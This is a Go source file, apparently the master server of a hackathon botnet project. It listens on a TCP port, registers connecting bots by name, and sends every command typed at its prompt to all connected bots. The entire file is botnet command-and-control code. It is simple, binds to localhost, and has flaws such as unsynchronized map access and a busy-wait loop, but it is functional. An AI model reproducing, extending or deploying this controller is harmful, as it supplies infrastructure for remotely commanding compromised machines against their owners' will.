package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"github.com/tfpgh/treehacks-botnet-go/internal"
	"net"
	"os"
	"strconv"
	"time"
)

const SERVER_HOST string = "localhost"
const SERVER_PORT uint16 = 9999

func beginServerInstance(host string, port uint16) *net.Listener {
	listenString := host + ":" + strconv.Itoa(int(port))
	fmt.Printf("Beginning master on %v.\n", listenString)
	listener, err := net.Listen("tcp", listenString)
	if err != nil {
		fmt.Printf("Master could not listen on %v. Panicking!\n", listenString)
	} else {
		fmt.Printf("Master successfully listening on %v.\n", listenString)
	}

	return &listener
}

func processConnections(listener *net.Listener, botMap *map[string]*net.Conn, killSwitch *bool) {
	fmt.Println("Beginning to handle connections.")
	for !*killSwitch {
		connection, err := (*listener).Accept()
		if err != nil {
			if *killSwitch {
				break
			} else {
				fmt.Println("Error accepting. Panicking!")
				panic(err)
			}
		}
		go handleBotConnection(&connection, botMap, killSwitch)
	}
}

func handleBotConnection(connection *net.Conn, botMap *map[string]*net.Conn, killSwitch *bool) {
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			fmt.Println("Error closing bot connection")
		}
	}(*connection)

	buffer := make([]byte, 128)
	bLen, err := (*connection).Read(buffer)
	if err != nil {
		fmt.Println("Error reading bot connection")
		return
	}

	var helloPacket internal.HelloPacket
	err = json.Unmarshal(buffer[:bLen], &helloPacket)
	if err != nil {
		fmt.Println("Bot sent invalid data")
		return
	}

	(*botMap)[helloPacket.BotName] = connection
	for {
		if *killSwitch {
			return // Closes connection
		}
	}
}

func sendCommand(connection *net.Conn, command string) {
	commandPacketJSON, _ := json.Marshal(internal.CommandPacket{Command: command})
	_, err := (*connection).Write(commandPacketJSON)
	if err != nil {
		fmt.Printf("Error sending command: %v\n", err)
	}
}

func main() {
	listener := beginServerInstance(SERVER_HOST, SERVER_PORT)
	defer func(listener net.Listener) {
		err := listener.Close()
		if err != nil {
			fmt.Println("Error closing listener")
		}
	}(*listener)

	botMap := make(map[string]*net.Conn)
	killSwitch := false
	go processConnections(listener, &botMap, &killSwitch)

	time.Sleep(time.Second)

	fmt.Println("Type \"list\" for a list of connected bots. Press enter on a blank line to exit.")
	fmt.Println("Anything else will be treated as a command to send to bots.")

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">> ")
		command, _ := reader.ReadString('\n')
		command = command[:len(command)-1]

		if command == "" {
			fmt.Println("Exiting!")
			killSwitch = true
			time.Sleep(time.Second)
			break
		}

		if command == "list" {
			fmt.Println(botMap)
			continue
		}

		for _, conn := range botMap {
			go sendCommand(conn, command)
		}
	}
}
